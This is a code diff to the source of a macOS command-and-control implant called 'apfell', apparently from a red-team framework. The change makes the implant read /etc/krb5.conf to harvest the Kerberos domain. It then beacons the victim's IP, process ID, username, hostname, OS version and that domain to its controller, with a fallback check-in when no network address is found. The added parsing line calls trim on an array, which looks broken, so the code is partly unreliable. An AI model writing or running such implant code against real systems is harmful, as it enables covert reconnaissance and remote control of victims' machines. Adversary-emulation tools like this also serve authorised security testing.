@@ -133,14 +133,28 @@ var jsimports = "";
 if( $.NSDate.date.compare(C2.kill_date) === $.NSOrderedDescending ){
   $.NSApplication.sharedApplication.terminate(this);
 }
+let ip_found = false;
+C2.commands =  Object.keys(commands_dict);
+let domain = "";
+if(does_file_exist("/etc/krb5.conf")){
+    let contents = $.NSString.stringWithContentsOfFileEncodingError("/etc/krb5.conf", $.NSUTF8StringEncoding, $.nil).js;
+    contents = contents.split("\n");
+    for(let j = 0; j < contents.length; j++){
+        if(contents[j].includes("default_realm")){
+            domain = contents[j].split("=").trim();
+        }
+    }
+}
 for(let i=0; i < apfell.ip.length; i++){
 	let ip = apfell.ip[i];
 	if (ip.includes(".") && ip !== "127.0.0.1"){ // the includes(".") is to make sure we're looking at IPv4
-		//console.log("found ip, checking in");
-		C2.commands =  Object.keys(commands_dict);
-		C2.checkin(ip,apfell.pid,apfell.user,ObjC.unwrap(apfell.procInfo.hostName),"macOS" + " " + apfell.osVersion, "x64");
+		C2.checkin(ip,apfell.pid,apfell.user,ObjC.unwrap(apfell.procInfo.hostName),apfell.osVersion, "x64", domain);
+		ip_found = true;
 		break;
 	}
+}
+if(!ip_found){
+    C2.checkin("127.0.0.1",apfell.pid,apfell.user,ObjC.unwrap(apfell.procInfo.hostName),apfell.osVersion, "x64", domain);
 }
 //---------------------------MAIN LOOP ----------------------------------------
 function sleepWakeUp(){
